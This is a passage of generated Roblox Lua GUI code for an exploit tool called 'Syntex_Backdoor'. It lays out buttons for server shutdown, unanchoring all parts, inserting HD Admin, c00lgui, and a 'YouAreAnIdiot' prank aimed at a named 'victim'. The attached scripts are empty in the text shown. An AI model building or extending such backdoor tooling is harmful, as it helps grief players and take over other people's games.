G2L["cb"]["Text"] = [[Shutdown (Set Reason)]];
G2L["cb"]["Position"] = UDim2.new(0.69162, 0, 0.45344, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Shutdown.LocalScript
G2L["cc"] = Instance.new("LocalScript", G2L["cb"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Shutdown.UICorner
G2L["cd"] = Instance.new("UICorner", G2L["cb"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Shutdown.new
G2L["ce"] = Instance.new("UIStroke", G2L["cb"]);
G2L["ce"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["ce"]["Name"] = [[new]];
G2L["ce"]["Thickness"] = 2;
G2L["ce"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.UnAnchor
G2L["cf"] = Instance.new("TextButton", G2L["95"]);
G2L["cf"]["BorderSizePixel"] = 0;
G2L["cf"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["cf"]["TextSize"] = 20;
G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["cf"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["cf"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["cf"]["Name"] = [[UnAnchor]];
G2L["cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["cf"]["Text"] = [[UnAnchor All]];
G2L["cf"]["Position"] = UDim2.new(0.03659, 0, 0.34892, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.UnAnchor.LocalScript
G2L["d0"] = Instance.new("LocalScript", G2L["cf"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.UnAnchor.UICorner
G2L["d1"] = Instance.new("UICorner", G2L["cf"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.UnAnchor.new
G2L["d2"] = Instance.new("UIStroke", G2L["cf"]);
G2L["d2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["d2"]["Name"] = [[new]];
G2L["d2"]["Thickness"] = 2;
G2L["d2"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.popups
G2L["d3"] = Instance.new("TextButton", G2L["95"]);
G2L["d3"]["BorderSizePixel"] = 0;
G2L["d3"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["d3"]["TextSize"] = 22;
G2L["d3"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["d3"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["d3"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["d3"]["Name"] = [[popups]];
G2L["d3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d3"]["Text"] = [[Set Popups]];
G2L["d3"]["Position"] = UDim2.new(0.36103, 0, 0.34961, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.popups.LocalScript
G2L["d4"] = Instance.new("LocalScript", G2L["d3"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.popups.UICorner
G2L["d5"] = Instance.new("UICorner", G2L["d3"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.popups.new
G2L["d6"] = Instance.new("UIStroke", G2L["d3"]);
G2L["d6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["d6"]["Name"] = [[new]];
G2L["d6"]["Thickness"] = 2;
G2L["d6"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Exser
G2L["d7"] = Instance.new("TextButton", G2L["95"]);
G2L["d7"]["TextWrapped"] = true;
G2L["d7"]["BorderSizePixel"] = 0;
G2L["d7"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["d7"]["TextSize"] = 35;
G2L["d7"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["d7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["d7"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["d7"]["Name"] = [[Exser]];
G2L["d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d7"]["Text"] = [[Exser]];
G2L["d7"]["Position"] = UDim2.new(0.69162, 0, 0.55558, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Exser.LocalScript
G2L["d8"] = Instance.new("LocalScript", G2L["d7"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Exser.UICorner
G2L["d9"] = Instance.new("UICorner", G2L["d7"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Exser.new
G2L["da"] = Instance.new("UIStroke", G2L["d7"]);
G2L["da"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["da"]["Name"] = [[new]];
G2L["da"]["Thickness"] = 2;
G2L["da"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.HdAdminInsert
G2L["db"] = Instance.new("TextButton", G2L["95"]);
G2L["db"]["TextWrapped"] = true;
G2L["db"]["BorderSizePixel"] = 0;
G2L["db"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["db"]["TextSize"] = 20;
G2L["db"]["TextScaled"] = true;
G2L["db"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["db"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["db"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["db"]["Name"] = [[HdAdminInsert]];
G2L["db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["db"]["Text"] = [[Insert HD Admin]];
G2L["db"]["Position"] = UDim2.new(0.692, 0, 0.655, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.HdAdminInsert.LocalScript
G2L["dc"] = Instance.new("LocalScript", G2L["db"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.HdAdminInsert.UICorner
G2L["dd"] = Instance.new("UICorner", G2L["db"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.HdAdminInsert.new
G2L["de"] = Instance.new("UIStroke", G2L["db"]);
G2L["de"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["de"]["Name"] = [[new]];
G2L["de"]["Thickness"] = 2;
G2L["de"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.HdAdminRank
G2L["df"] = Instance.new("TextButton", G2L["95"]);
G2L["df"]["TextWrapped"] = true;
G2L["df"]["BorderSizePixel"] = 0;
G2L["df"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["df"]["TextSize"] = 20;
G2L["df"]["TextScaled"] = true;
G2L["df"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["df"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["df"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["df"]["Name"] = [[HdAdminRank]];
G2L["df"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["df"]["Text"] = [[HD Admin Ranker]];
G2L["df"]["Position"] = UDim2.new(0.36279, 0, 0.55577, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.HdAdminRank.LocalScript
G2L["e0"] = Instance.new("LocalScript", G2L["df"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.HdAdminRank.UICorner
G2L["e1"] = Instance.new("UICorner", G2L["df"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.HdAdminRank.new
G2L["e2"] = Instance.new("UIStroke", G2L["df"]);
G2L["e2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["e2"]["Name"] = [[new]];
G2L["e2"]["Thickness"] = 2;
G2L["e2"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.c00lgui
G2L["e3"] = Instance.new("TextButton", G2L["95"]);
G2L["e3"]["TextWrapped"] = true;
G2L["e3"]["BorderSizePixel"] = 0;
G2L["e3"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["e3"]["TextSize"] = 35;
G2L["e3"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["e3"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["e3"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["e3"]["Name"] = [[c00lgui]];
G2L["e3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e3"]["Text"] = [[c00lgui]];
G2L["e3"]["Position"] = UDim2.new(0.035, 0, 0.655, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.c00lgui.LocalScript
G2L["e4"] = Instance.new("LocalScript", G2L["e3"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.c00lgui.UICorner
G2L["e5"] = Instance.new("UICorner", G2L["e3"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.c00lgui.new
G2L["e6"] = Instance.new("UIStroke", G2L["e3"]);
G2L["e6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["e6"]["Name"] = [[new]];
G2L["e6"]["Thickness"] = 2;
G2L["e6"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.youareanidiot
G2L["e7"] = Instance.new("TextButton", G2L["95"]);
G2L["e7"]["TextWrapped"] = true;
G2L["e7"]["BorderSizePixel"] = 0;
G2L["e7"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["e7"]["TextSize"] = 20;
G2L["e7"]["TextScaled"] = true;
G2L["e7"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["e7"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["e7"]["Name"] = [[youareanidiot]];
G2L["e7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e7"]["Text"] = [[YouAreAnIdiot (Put victim name in textbox)]];
G2L["e7"]["Position"] = UDim2.new(0.363, 0, 0.655, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.youareanidiot.LocalScript
G2L["e8"] = Instance.new("LocalScript", G2L["e7"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.youareanidiot.UICorner
G2L["e9"] = Instance.new("UICorner", G2L["e7"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.youareanidiot.new
G2L["ea"] = Instance.new("UIStroke", G2L["e7"]);
G2L["ea"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["ea"]["Name"] = [[new]];
G2L["ea"]["Thickness"] = 2;
G2L["ea"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.TextLabel
G2L["eb"] = Instance.new("TextLabel", G2L["95"]);
G2L["eb"]["BorderSizePixel"] = 0;
G2L["eb"]["TextSize"] = 34;
G2L["eb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["eb"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["eb"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["eb"]["BackgroundTransparency"] = 1;
G2L["eb"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["eb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["eb"]["Text"] = [[-- More scripts coming soon --]];
G2L["eb"]["Position"] = UDim2.new(0.306, 0, 0.811, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.UICorner
G2L["ec"] = Instance.new("UICorner", G2L["94"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.UIGradient
G2L["ed"] = Instance.new("UIGradient", G2L["94"]);
G2L["ed"]["Rotation"] = 132;
G2L["ed"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.UIGradient.LocalScript
G2L["ee"] = Instance.new("LocalScript", G2L["ed"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.UIStroke
G2L["ef"] = Instance.new("UIStroke", G2L["94"]);
G2L["ef"]["Transparency"] = 0.5;
G2L["ef"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["ef"]["Thickness"] = 2;
G2L["ef"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.galaxyThemeGradient
G2L["f0"] = Instance.new("UIGradient", G2L["94"]);
G2L["f0"]["Enabled"] = false;
G2L["f0"]["Rotation"] = 132;
G2L["f0"]["Name"] = [[galaxyThemeGradient]];
G2L["f0"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 18, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.galaxyThemeGradient.LocalScript
G2L["f1"] = Instance.new("LocalScript", G2L["f0"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.lunarThemeGradient
G2L["f2"] = Instance.new("UIGradient", G2L["94"]);
G2L["f2"]["Enabled"] = false;
G2L["f2"]["Rotation"] = 132;
G2L["f2"]["Name"] = [[lunarThemeGradient]];
G2L["f2"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.lunarThemeGradient.LocalScript
G2L["f3"] = Instance.new("LocalScript", G2L["f2"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.txt
G2L["f4"] = Instance.new("TextBox", G2L["94"]);
G2L["f4"]["Name"] = [[txt]];
G2L["f4"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["f4"]["BorderSizePixel"] = 0;
G2L["f4"]["TextWrapped"] = true;
G2L["f4"]["TextSize"] = 14;
G2L["f4"]["TextColor3"] = Color3.fromRGB(246, 246, 246);
G2L["f4"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["f4"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["f4"]["PlaceholderText"] = [[Text for Hint/Message here...]];
G2L["f4"]["Size"] = UDim2.new(0, 231, 0, 42);
G2L["f4"]["Position"] = UDim2.new(0, 0, 1.03873, 0);
G2L["f4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f4"]["Text"] = [[]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.txt.UICorner
G2L["f5"] = Instance.new("UICorner", G2L["f4"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.txt.UIStroke
G2L["f6"] = Instance.new("UIStroke", G2L["f4"]);
G2L["f6"]["Transparency"] = 0.5;
G2L["f6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["f6"]["Thickness"] = 2;
G2L["f6"]["Color"] = Color3.fromRGB(224, 224, 224);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ID
G2L["f7"] = Instance.new("TextBox", G2L["94"]);
G2L["f7"]["Name"] = [[ID]];
G2L["f7"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["f7"]["BorderSizePixel"] = 0;
G2L["f7"]["TextWrapped"] = true;
G2L["f7"]["TextSize"] = 11;
G2L["f7"]["TextColor3"] = Color3.fromRGB(246, 246, 246);
G2L["f7"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["f7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["f7"]["PlaceholderText"] = [[ID For Decal/Particles/Sound/Popups here...]];
G2L["f7"]["Size"] = UDim2.new(0, 231, 0, 42);
G2L["f7"]["Position"] = UDim2.new(0.54599, 0, 1.03873, 0);
G2L["f7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f7"]["Text"] = [[]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ID.UICorner
G2L["f8"] = Instance.new("UICorner", G2L["f7"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ID.UIStroke
G2L["f9"] = Instance.new("UIStroke", G2L["f7"]);
G2L["f9"]["Transparency"] = 0.5;
G2L["f9"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["f9"]["Thickness"] = 2;
G2L["f9"]["Color"] = Color3.fromRGB(224, 224, 224);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings
G2L["fa"] = Instance.new("Frame", G2L["d"]);
G2L["fa"]["Visible"] = false;
G2L["fa"]["BorderSizePixel"] = 0;
G2L["fa"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["fa"]["Size"] = UDim2.new(0, 512, 0, 284);
G2L["fa"]["Position"] = UDim2.new(0.23493, 0, -0.001, 0);
G2L["fa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fa"]["Name"] = [[Settings]];
G2L["fa"]["BackgroundTransparency"] = 0.1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.UICorner
G2L["fb"] = Instance.new("UICorner", G2L["fa"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.UIGradient
G2L["fc"] = Instance.new("UIGradient", G2L["fa"]);
G2L["fc"]["Rotation"] = 132;
G2L["fc"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 255, 18))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.UIGradient.LocalScript
G2L["fd"] = Instance.new("LocalScript", G2L["fc"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.UIStroke
G2L["fe"] = Instance.new("UIStroke", G2L["fa"]);
G2L["fe"]["Transparency"] = 0.5;
G2L["fe"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["fe"]["Thickness"] = 2;
G2L["fe"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame
G2L["ff"] = Instance.new("ScrollingFrame", G2L["fa"]);
G2L["ff"]["Active"] = true;
G2L["ff"]["BorderSizePixel"] = 0;
G2L["ff"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ff"]["Size"] = UDim2.new(0, 502, 0, 284);
G2L["ff"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ff"]["Position"] = UDim2.new(0.01953, 0, -0, 0);
G2L["ff"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ff"]["BackgroundTransparency"] = 1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame
G2L["100"] = Instance.new("Frame", G2L["ff"]);
G2L["100"]["BorderSizePixel"] = 0;
G2L["100"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["100"]["Size"] = UDim2.new(0, 502, 0, 264);
G2L["100"]["Position"] = UDim2.new(0.02, 0, 0.042, 0);
G2L["100"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["100"]["BackgroundTransparency"] = 1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon
G2L["101"] = Instance.new("Frame", G2L["100"]);
G2L["101"]["BorderSizePixel"] = 0;
G2L["101"]["BackgroundColor3"] = Color3.fromRGB(10, 10, 10);
G2L["101"]["Size"] = UDim2.new(0, 471, 0, 45);
G2L["101"]["Position"] = UDim2.new(-0.00103, 0, -0.04819, 0);
G2L["101"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["101"]["Name"] = [[noIcon]];
G2L["101"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon.UICorner
G2L["102"] = Instance.new("UICorner", G2L["101"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon.TextLabel
G2L["103"] = Instance.new("TextLabel", G2L["101"]);
G2L["103"]["BorderSizePixel"] = 0;
G2L["103"]["TextSize"] = 24;
G2L["103"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["103"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["103"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["103"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["103"]["BackgroundTransparency"] = 1;
G2L["103"]["Size"] = UDim2.new(0, 200, 0, 45);
G2L["103"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["103"]["Text"] = [[No Logo]];
G2L["103"]["Position"] = UDim2.new(0.015, 0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon.TextButton
G2L["104"] = Instance.new("TextButton", G2L["101"]);
G2L["104"]["BorderSizePixel"] = 0;
G2L["104"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["104"]["TextSize"] = 14;
G2L["104"]["BackgroundColor3"] = Color3.fromRGB(224, 0, 0);
G2L["104"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["104"]["Size"] = UDim2.new(0, 72, 0, 26);
G2L["104"]["BackgroundTransparency"] = 0.6;
G2L["104"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["104"]["Text"] = [[]];
G2L["104"]["Position"] = UDim2.new(0.82359, 0, 0.2, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon.TextButton.anim
G2L["105"] = Instance.new("LocalScript", G2L["104"]);
G2L["105"]["Name"] = [[anim]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon.TextButton.UICorner
G2L["106"] = Instance.new("UICorner", G2L["104"]);
G2L["106"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon.TextButton.UIStroke
G2L["107"] = Instance.new("UIStroke", G2L["104"]);
G2L["107"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["107"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon.TextButton.Frame
G2L["108"] = Instance.new("Frame", G2L["104"]);
G2L["108"]["BorderSizePixel"] = 0;
G2L["108"]["BackgroundColor3"] = Color3.fromRGB(142, 142, 142);
G2L["108"]["Size"] = UDim2.new(0, 15, 0, 15);
G2L["108"]["Position"] = UDim2.new(0.111, 0, 0.231, 0);
G2L["108"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon.TextButton.Frame.UICorner
G2L["109"] = Instance.new("UICorner", G2L["108"]);
G2L["109"]["CornerRadius"] = UDim.new(1, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon.TextButton.Frame.UIStroke
G2L["10a"] = Instance.new("UIStroke", G2L["108"]);
G2L["10a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["10a"]["Thickness"] = 1.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.noIcon.UIStroke
G2L["10b"] = Instance.new("UIStroke", G2L["101"]);
G2L["10b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["10b"]["Thickness"] = 2.5;
G2L["10b"]["Color"] = Color3.fromRGB(18, 18, 18);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme
G2L["10c"] = Instance.new("Frame", G2L["100"]);
G2L["10c"]["BorderSizePixel"] = 0;
G2L["10c"]["BackgroundColor3"] = Color3.fromRGB(10, 10, 10);
G2L["10c"]["Size"] = UDim2.new(0, 471, 0, 45);
G2L["10c"]["Position"] = UDim2.new(-0.00103, 0, 0.33818, 0);
G2L["10c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10c"]["Name"] = [[normalTheme]];
G2L["10c"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme.UICorner
G2L["10d"] = Instance.new("UICorner", G2L["10c"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme.UIStroke
G2L["10e"] = Instance.new("UIStroke", G2L["10c"]);
G2L["10e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["10e"]["Thickness"] = 2.5;
G2L["10e"]["Color"] = Color3.fromRGB(18, 18, 18);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme.TextLabel
G2L["10f"] = Instance.new("TextLabel", G2L["10c"]);
G2L["10f"]["BorderSizePixel"] = 0;
G2L["10f"]["TextSize"] = 24;
G2L["10f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["10f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["10f"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["10f"]["BackgroundTransparency"] = 1;
G2L["10f"]["Size"] = UDim2.new(0, 200, 0, 45);
G2L["10f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10f"]["Text"] = [[Classic Theme (Green to red)]];
G2L["10f"]["Position"] = UDim2.new(0.015, 0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Settings.ScrollingFrame.Frame.normalTheme.TextButton
